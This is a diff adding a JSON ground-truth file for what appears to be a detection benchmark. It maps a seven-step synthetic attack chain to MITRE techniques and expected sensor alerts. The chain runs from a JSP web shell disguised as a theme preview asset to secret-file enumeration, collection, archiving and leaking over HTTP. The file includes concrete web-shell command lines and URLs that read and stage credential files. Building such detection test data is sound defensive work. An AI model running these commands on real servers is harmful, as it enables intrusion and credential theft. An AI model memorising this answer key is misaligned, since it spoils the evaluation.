@@ -1,0 +1,253 @@
+{
+  "chain_id": "template_upload_webshell_secret_archive_001",
+  "ground_truth_type": "long_ttp_chain_level_from_step_annotations",
+  "matching_note": "Use parent-family matching when the experiment ignores MITRE sub-technique suffixes.",
+  "trigger_step_id": "S7",
+  "step_count": 7,
+  "technique_ids": [
+    "T1033",
+    "T1048.003",
+    "T1082",
+    "T1083",
+    "T1505.003",
+    "T1552.001",
+    "T1560.001"
+  ],
+  "techniques": [
+    {
+      "tech_id": "T1033",
+      "tech_name": "System Owner/User Discovery",
+      "tactic": "Discovery"
+    },
+    {
+      "tech_id": "T1048.003",
+      "tech_name": "Exfiltration Over Unencrypted Non-C2 Protocol",
+      "tactic": "Exfiltration"
+    },
+    {
+      "tech_id": "T1082",
+      "tech_name": "System Information Discovery",
+      "tactic": "Discovery"
+    },
+    {
+      "tech_id": "T1083",
+      "tech_name": "File and Directory Discovery",
+      "tactic": "Discovery"
+    },
+    {
+      "tech_id": "T1505.003",
+      "tech_name": "Web Shell",
+      "tactic": "Persistence"
+    },
+    {
+      "tech_id": "T1552.001",
+      "tech_name": "Credentials In Files",
+      "tactic": "Credential Access"
+    },
+    {
+      "tech_id": "T1560.001",
+      "tech_name": "Archive via Utility",
+      "tactic": "Collection"
+    }
+  ],
+  "tactic_names": [
+    "Collection",
+    "Credential Access",
+    "Discovery",
+    "Exfiltration",
+    "Persistence"
+  ],
+  "steps": [
+    {
+      "step_id": "S1",
+      "name": "Upload a malicious JSP disguised as an operations theme preview asset",
+      "attack_techniques": [
+        {
+          "tech_id": "T1505.003",
+          "tech_name": "Web Shell",
+          "tactic": "Persistence"
+        }
+      ],
+      "expected_event_refs": [
+        "suricata:6b7c1001-2201-4a01-9020-b10000000801",
+        "openrasp:5a7c1001-1101-4a01-9010-a10000000801"
+      ],
+      "expected_signals": [
+        "attack_type=fileUpload",
+        "plugin_algorithm=fileUpload_multipart_script",
+        "path=/api/v1/admin/theme/package-import",
+        "multipart filename=ops-theme-preview.jsp",
+        "alert.signature=ET WEB_SERVER Suspicious Ops Theme Package Import with Server-Side Script",
+        "request_id=ops-theme-chain-20260821-import-01"
+      ]
+    },
+    {
+      "step_id": "S2",
+      "name": "Drop the uploaded JSP into a web-accessible theme preview directory",
+      "attack_techniques": [
+        {
+          "tech_id": "T1505.003",
+          "tech_name": "Web Shell",
+          "tactic": "Persistence"
+        }
+      ],
+      "expected_event_refs": [
+        "openrasp:5a7c1001-1101-4a01-9010-a10000000802",
+        "falco:7d8e3001-3301-4a01-9030-c10000000802"
+      ],
+      "expected_signals": [
+        "attack_type=writeFile",
+        "plugin_algorithm=writeFile_script",
+        "realpath=/srv/dotserver/tomcat-9.0.41/webapps/theme-preview/ops-theme-preview.jsp",
+        "plugin_message=File write - Creating or appending to a server-side script file",
+        "fd.name=/srv/dotserver/tomcat-9.0.41/webapps/theme-preview/ops-theme-preview.jsp"
+      ]
+    },
+    {
+      "step_id": "S3",
+      "name": "Trigger runtime fingerprint commands through the dropped preview JSP",
+      "attack_techniques": [
+        {
+          "tech_id": "T1082",
+          "tech_name": "System Information Discovery",
+          "tactic": "Discovery"
+        },
+        {
+          "tech_id": "T1033",
+          "tech_name": "System Owner/User Discovery",
+          "tactic": "Discovery"
+        },
+        {
+          "tech_id": "T1083",
+          "tech_name": "File and Directory Discovery",
+          "tactic": "Discovery"
+        }
+      ],
+      "expected_event_refs": [
+        "suricata:6b7c1001-2201-4a01-9020-b10000000803",
+        "openrasp:5a7c1001-1101-4a01-9010-a10000000803",
+        "falco:7d8e3001-3301-4a01-9030-c10000000803"
+      ],
+      "expected_signals": [
+        "attack_type=command",
+        "plugin_algorithm=command_other",
+        "http.url=/theme-preview/ops-theme-preview.jsp?mode=fingerprint&cmd=id%20%26%26%20uname%20-a%20%26%26%20pwd%20%26%26%20ls%20/srv/dotserver/tomcat-9.0.41/webapps/ROOT/WEB-INF%20%26%26%20ls%20/srv/dotserver/tomcat-9.0.41/webapps/ROOT/WEB-INF/classes%20%7C%20head%20-n%205",
+        "attack_params.command=sh -c id && uname -a && pwd && ls /srv/dotserver/tomcat-9.0.41/webapps/ROOT/WEB-INF && ls /srv/dotserver/tomcat-9.0.41/webapps/ROOT/WEB-INF/classes | head -n 5",
+        "attack_params.discovery_target=runtime_identity_and_application_layout",
+        "attack_params.discovered_working_directory=/srv/dotserver/tomcat-9.0.41/webapps/ROOT",
+        "attack_params.discovered_os_family=linux",
+        "attack_params.discovered_kernel_version=6.8.0-111-generic",
+        "attack_params.discovered_directories=/srv/dotserver/tomcat-9.0.41/webapps/ROOT/WEB-INF,/srv/dotserver/tomcat-9.0.41/webapps/ROOT/WEB-INF/classes",
+        "attack_params.discovered_files=web.xml,ops-theme-signing-secret.properties,ops-theme-preview-key-metadata.json",
+        "alert.signature=ET WEB_SERVER Ops Theme Preview Runtime Identity, System Information, and Layout Discovery",
+        "proc.cmdline=sh -c id && uname -a && pwd && ls /srv/dotserver/tomcat-9.0.41/webapps/ROOT/WEB-INF && ls /srv/dotserver/tomcat-9.0.41/webapps/ROOT/WEB-INF/classes | head -n 5"
+      ]
+    },
+    {
+      "step_id": "S4",
+      "name": "Enumerate likely secret-bearing files under WEB-INF/classes",
+      "attack_techniques": [
+        {
+          "tech_id": "T1083",
+          "tech_name": "File and Directory Discovery",
+          "tactic": "Discovery"
+        }
+      ],
+      "expected_event_refs": [
+        "suricata:6b7c1001-2201-4a01-9020-b10000000804",
+        "openrasp:5a7c1001-1101-4a01-9010-a10000000804",
+        "falco:7d8e3001-3301-4a01-9030-c10000000804"
+      ],
+      "expected_signals": [
+        "attack_type=command",
+        "plugin_algorithm=command_other",
+        "http.url=/theme-preview/ops-theme-preview.jsp?mode=discover",
+        "attack_params.command=sh -c ls /srv/dotserver/tomcat-9.0.41/webapps/ROOT/WEB-INF/classes | grep -E 'secret|credential|signing'",
+        "attack_params.discovery_target=local_file_and_directory_names",
+        "attack_params.discovery_operation=filename_enumeration",
+        "attack_params.file_read_performed=false",
+        "attack_params.candidate_secret_files=ops-theme-signing-secret.properties,ops-theme-credential-cache.properties,ops-theme-preview-key-metadata.json",
+        "alert.signature=ET WEB_SERVER Ops Theme Preview Secret Filename Enumeration",
+        "proc.cmdline=sh -c ls /srv/dotserver/tomcat-9.0.41/webapps/ROOT/WEB-INF/classes | grep -E 'secret|credential|signing'"
+      ]
+    },
+    {
+      "step_id": "S5",
+      "name": "Collect the discovered signing-secret file into a staging file",
+      "attack_techniques": [
+        {
+          "tech_id": "T1552.001",
+          "tech_name": "Credentials In Files",
+          "tactic": "Credential Access"
+        }
+      ],
+      "expected_event_refs": [
+        "suricata:6b7c1001-2201-4a01-9020-b10000000805",
+        "openrasp:5a7c1001-1101-4a01-9010-a10000000805",
+        "falco:7d8e3001-3301-4a01-9030-c10000000805"
+      ],
+      "expected_signals": [
+        "attack_type=command",
+        "plugin_algorithm=command_other",
+        "http.url=/theme-preview/ops-theme-preview.jsp?mode=collect",
+        "attack_params.command=sh -c cat /srv/dotserver/tomcat-9.0.41/webapps/ROOT/WEB-INF/classes/ops-theme-signing-secret.properties > /srv/dotserver/tomcat-9.0.41/temp/theme-preview/ops-theme-secret-stage.txt",
+        "alert.signature=ET WEB_SERVER Ops Theme Preview Credential File Collection",
+        "fd.name=/srv/dotserver/tomcat-9.0.41/webapps/ROOT/WEB-INF/classes/ops-theme-signing-secret.properties"
+      ]
+    },
+    {
+      "step_id": "S6",
+      "name": "Archive the staged secret file into a portable artifact",
+      "attack_techniques": [
+        {
+          "tech_id": "T1560.001",
+          "tech_name": "Archive via Utility",
+          "tactic": "Collection"
+        }
+      ],
+      "expected_event_refs": [
+        "suricata:6b7c1001-2201-4a01-9020-b10000000806",
+        "openrasp:5a7c1001-1101-4a01-9010-a10000000806",
+        "falco:7d8e3001-3301-4a01-9030-c10000000806"
+      ],
+      "expected_signals": [
+        "attack_type=command",
+        "plugin_algorithm=command_other",
+        "http.url=/theme-preview/ops-theme-preview.jsp?mode=stage",
+        "attack_params.command=sh -c tar -czf /srv/dotserver/tomcat-9.0.41/temp/theme-preview/ops-theme-secret-stage.tgz -C /srv/dotserver/tomcat-9.0.41/temp/theme-preview ops-theme-secret-stage.txt",
+        "alert.signature=ET WEB_SERVER Ops Theme Preview Secret Archive Staging",
+        "proc.cmdline=sh -c tar -czf /srv/dotserver/tomcat-9.0.41/temp/theme-preview/ops-theme-secret-stage.tgz -C /srv/dotserver/tomcat-9.0.41/temp/theme-preview ops-theme-secret-stage.txt"
+      ]
+    },
+    {
+      "step_id": "S7",
+      "name": "Leak the staged secret material back in the HTTP response",
+      "attack_techniques": [
+        {
+          "tech_id": "T1048.003",
+          "tech_name": "Exfiltration Over Unencrypted Non-C2 Protocol",
+          "tactic": "Exfiltration"
+        }
+      ],
+      "expected_event_refs": [
+        "suricata:6b7c1001-2201-4a01-9020-b10000000807",
+        "openrasp:5a7c1001-1101-4a01-9010-a10000000807",
+        "falco:7d8e3001-3301-4a01-9030-c10000000807"
+      ],
+      "expected_signals": [
+        "attack_type=response",
+        "plugin_algorithm=response_dataLeak",
+        "http.url=/theme-preview/ops-theme-preview.jsp?mode=download&artifact=ops-theme-secret-stage",
+        "alert.signature=ET WEB_SERVER Ops Theme Preview Staged Secret HTTP Leak",
+        "ops.theme.signing.api_token=synthetic-token-theme-001",
+        "ops.theme.signing.key_id=synthetic-key-002",
+        "ops.theme.signing.service_account=ops_theme_exporter",
+        "proc.cmdline=cat /srv/dotserver/tomcat-9.0.41/temp/theme-preview/ops-theme-secret-stage.txt"
+      ]
+    }
+  ]
+}
+
+
+
+
